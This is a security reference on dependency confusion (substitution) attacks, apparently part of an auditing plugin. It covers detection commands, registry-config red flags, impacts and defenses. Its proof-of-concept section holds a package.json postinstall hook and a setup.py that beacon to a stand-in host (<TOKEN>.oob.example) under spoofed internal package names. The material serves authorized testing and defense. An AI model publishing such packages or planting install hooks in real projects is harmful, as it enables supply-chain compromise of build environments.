# Dependency Confusion (Substitution Attack)

Dependency confusion is a real, reportable supply-chain class (CWE-1357 / CWE-1104). A build resolves
an **internal** package name from a **public** registry because the public copy has a higher version —
and the attacker owns that public copy. Install-time scripts then run arbitrary code inside CI/CD,
developer laptops, or production build hosts, with whatever secrets those environments hold.

> **This pairs with TrinetLayer's Dependency-Confusion engine.** For a live target, run
> `bash ${CLAUDE_PLUGIN_ROOT}/scripts/ghostjs-scan.sh <domain> --dc` (TrinetLayer `/api/v1`; needs
> `TRINETLAYER_API_KEY`, skips gracefully). GhostJS pulls internal package names out of a site's JS
> bundles/source maps; the `--dc` engine checks whether those names are unclaimed on the public
> registry. This reference is the source-side companion: find the same exposure in a repo you're
> auditing, before it ships.
>
> **Ethics / authorized scope only.** This class is legitimately reportable, but a proof of concept
> must be a **non-malicious callback only** (a DNS or HTTP beacon that proves install-time execution),
> on a name and scope you are authorized to test. Publishing a package to a public registry to squat
> or attack a name you do not own can violate registry Terms of Service and the law. Never ship an
> exfiltration or backdoor payload. Prefer proving the *gap* (an unclaimed internal name + a
> public-fallback resolver) over publishing anything at all.

---

## How it works

1. **Discovery** — attacker learns an internal package name. Leaks come from a committed
   `package.json`/`requirements.txt`, a public GitHub repo or fork, a job posting, a stack trace, a
   `.js` bundle or source map served in production, or a build log.
2. **Publication** — attacker publishes a package with that exact name and a **higher version**
   (e.g. `9.9.9`, `999.0.0`) to the public registry (npm / PyPI / RubyGems / …).
3. **Resolution confusion** — a build or a developer runs an install. The package manager consults
   both the private and the public registry, sees the higher public version, and prefers it — the
   "highest version wins regardless of source" rule is the whole bug.
4. **Malicious execution** — the public package installs and its install hooks
   (`preinstall`/`install`/`postinstall`, `setup.py`, gem `extconf.rb`/post-install, NuGet
   `install.ps1`) run arbitrary code, typically as root in CI.

**Why it exists:** internal names not reserved on public registries · resolvers that merge/rank
public and private sources by version · loose version constraints (`*`, `latest`, wide ranges) · no
lockfile integrity enforcement · no monitoring for unexpected public-registry pulls.

---

## Detection methodology (source-side)

The audit question is: **does any internal package name resolve, or fall back to, a public registry —
and is that name unclaimed publicly?**

**Step 1 — enumerate the internal names.** Pull package names and, critically, the names of
*dependencies* that look internal (company prefix, no public presence).

```bash
# npm/yarn/pnpm: the package's own name + every dependency name
grep -rhoE '"name"[[:space:]]*:[[:space:]]*"[^"]+"' --include=package.json . | sort -u
jq -r '.name, (.dependencies//{}|keys[]), (.devDependencies//{}|keys[])' $(find . -name package.json) 2>/dev/null | sort -u
# Python
grep -rhoE '^[A-Za-z0-9._-]+' --include=requirements*.txt . | sort -u
grep -rniE 'name\s*=' setup.py setup.cfg pyproject.toml 2>/dev/null
# Ruby / Go / Java / .NET
grep -rhoE "gem ['\"][^'\"]+" --include=Gemfile . ; grep -rhoE '^\s+[a-z0-9./-]+ v' go.mod 2>/dev/null
grep -rhoE '<(groupId|artifactId)>[^<]+' --include=pom.xml . ; grep -rhoE 'PackageReference Include="[^"]+"' --include=*.csproj .
```

**Step 2 — separate scoped vs unscoped / internal vs public.** On npm, `@scope/name` requires the
scope to be claimed and routed, so scoped packages are far safer; **unscoped** internal names are the
prime targets. Anything with a company prefix (`acme-`, `corp_`) that is not on the public registry is
a candidate.

**Step 3 — inspect registry configuration and lockfiles.** The vulnerability lives in the config, not
just the manifest.

```bash
# Registry config: is a PUBLIC fallback present, and is the internal scope pinned to a private registry?
cat .npmrc ~/.npmrc 2>/dev/null            # look for a bare registry= plus @scope:registry=, and //host/:_authToken
cat pip.conf ~/.pip/pip.conf .pip/pip.conf 2>/dev/null   # extra-index-url = public PyPI is the classic footgun
cat .gemrc Gemfile 2>/dev/null; cat nuget.config 2>/dev/null
grep -rniE 'registry|index-url|extra-index-url|--registry|source' .npmrc pip.conf Gemfile nuget.config 2>/dev/null
# Lockfiles: which source did each dep actually resolve from?
grep -niE 'resolved|registry\.npmjs\.org|pypi\.org|rubygems\.org' package-lock.json yarn.lock 2>/dev/null | head
# CI/CD & Docker: installs that omit a registry/frozen flag
grep -rniE 'npm i(nstall)?|pip install|bundle install|dotnet restore|go get' Dockerfile* .github/ .gitlab-ci.yml 2>/dev/null
```

Red flags: a bare `registry=` or `extra-index-url` pointing at the public registry with no scope
pinning · an internal dependency name that is **unclaimed** on the public registry · `npm install`
(not `npm ci`) / no `--frozen-lockfile` / no `--require-hashes` in CI or Docker · loose versions.

### Per-ecosystem checklist

| Ecosystem | Where names live | Install-time exec surface | Key config to check | Notes |
|-----------|------------------|---------------------------|---------------------|-------|
| **npm (Node)** | `package.json`, `*-lock.json`, `yarn.lock`, `pnpm-lock.yaml` | `preinstall`/`install`/`postinstall` scripts | `.npmrc`: bare `registry=` + `@scope:registry=`, `_authToken` | Unscoped internal names = high risk; scoped + routed = protected |
| **PyPI (Python)** | `requirements*.txt`, `setup.py`, `pyproject.toml`, `Pipfile` | `setup.py` runs on install | `pip.conf` `index-url` vs `extra-index-url` (public fallback) | `--extra-index-url` merges by highest version — **critical** footgun |
| **RubyGems** | `Gemfile`, `*.gemspec`, `Gemfile.lock` | gem `extconf.rb`, post-install hooks | `Gemfile` `source` block / `.gemrc :sources:` | Internal gems must pin an explicit private `source do…end` |
| **Maven (Java)** | `pom.xml`, `build.gradle` | build plugins execute | `settings.xml` repositories/mirrors, Nexus/Artifactory order | Public Central still consulted unless mirrored `*` |
| **NuGet (.NET)** | `*.csproj`, `packages.config` | `install.ps1` / build tasks | `nuget.config` `packageSources` + `packageSourceMapping` | Use `packageSourceMapping` to bind prefixes to a feed |
| **Go modules** | `go.mod`, `go.sum` | (no install scripts) | `GOPROXY`, `GONOSUMDB`/`GOPRIVATE`, `go.sum` | Lower risk: `go.sum` pins hashes; ensure `GOPRIVATE` covers internal module paths |

---

## Non-malicious verification PoC (callback only)

Prove **install-time code execution / public resolution** with a beacon — never a payload. Use a
DNS/HTTP callback host you control (e.g. an OOB/interactsh-style collaborator) and only a name/scope
you are authorized to test.

```jsonc
// package.json — npm: the ONLY effect is a callback proving the install hook ran
{
  "name": "acme-internal-utils",
  "version": "99.9.9",
  "description": "Authorized dependency-confusion PoC — callback only, no payload",
  "scripts": {
    "postinstall": "node -e \"require('https').get('https://<TOKEN>.oob.example/dc?pkg=acme-internal-utils')\""
  }
}
```

```python
# setup.py — PyPI: a single DNS/HTTP beacon, no data, no persistence
from setuptools import setup
import urllib.request
try:
    urllib.request.urlopen("https://<TOKEN>.oob.example/dc?pkg=acme-ml-toolkit", timeout=3)
except Exception:
    pass
setup(name="acme-ml-toolkit", version="999.0.0",
      description="Authorized PoC — callback only")
```

Even safer, and usually sufficient for a report: do **not** publish at all. Show (a) the internal name
is present in the repo/bundle, (b) it is **unclaimed** on the public registry
(`npm view <name>` / `pip index versions <name>` returns nothing), and (c) the resolver has a public
fallback with no scope pinning. That combination is the finding. A published callback beacon is a
last-resort confirmation of live execution, on authorized scope only. The beacon must carry no host
data, no environment variables, and no persistence — a bare ping is enough.

---

## Impact

Install hooks run with the installer's privileges (often **root in CI/CD**). Realistic outcomes:

- **RCE / secret theft** — exfiltrate `AWS_ACCESS_KEY_ID`, DB passwords, registry tokens from the
  build environment. Complete cloud-account compromise via a leaked CI credential.
- **Supply-chain compromise** — the malicious package becomes a permanent part of the artifact,
  reaching every downstream user and deployment.
- **IP theft** — source, proprietary models, and secrets uploaded during install.
- **Regulatory** — resulting breach triggers GDPR / HIPAA / PCI-DSS / SOC 2 exposure.

Historical anchor: in **February 2021, Alex Birsan** published public packages matching leaked
internal names and achieved code execution inside Apple, Microsoft, PayPal, Shopify, Netflix, Tesla,
and Uber — earning >$130,000 and naming the class.

---

## Defenses (what to recommend in the fix)

1. **Scope / namespace internal packages** and route the scope to the private registry only:
   `@acme:registry=https://nexus.acme.internal/…` with `always-auth=true`. On NuGet, use
   `packageSourceMapping`; on Go, set `GOPRIVATE`.
2. **Reserve the names publicly** — pre-register internal scopes/prefixes (placeholder `@acme/*`,
   `acme-*`) so no attacker can claim a colliding public name.
3. **One trusted index, no public fallback** — the classic bug is a public `extra-index-url` that pip
   merges by highest version. Use a single `index-url` (or a virtual repo that resolves internal
   **before** public and forbids public shadowing of an internal name).
4. **Enforce lockfile integrity in CI** — resolve only from the committed lockfile, never re-resolve
   "latest": `npm ci`, `yarn --frozen-lockfile`, `pip install --require-hashes -r requirements.txt`,
   `bundle install --frozen`.
5. **Pin exact versions**; commit `package-lock.json` / `Pipfile.lock` / `Gemfile.lock` / `go.sum`.
6. **Authenticate private registries** (rotate tokens, env-injected never hardcoded) and **monitor**
   build logs for unexpected public-registry pulls / version mismatches.

---

*Curated from TrinetLayer Learn (learn.trinetlayer.com).*
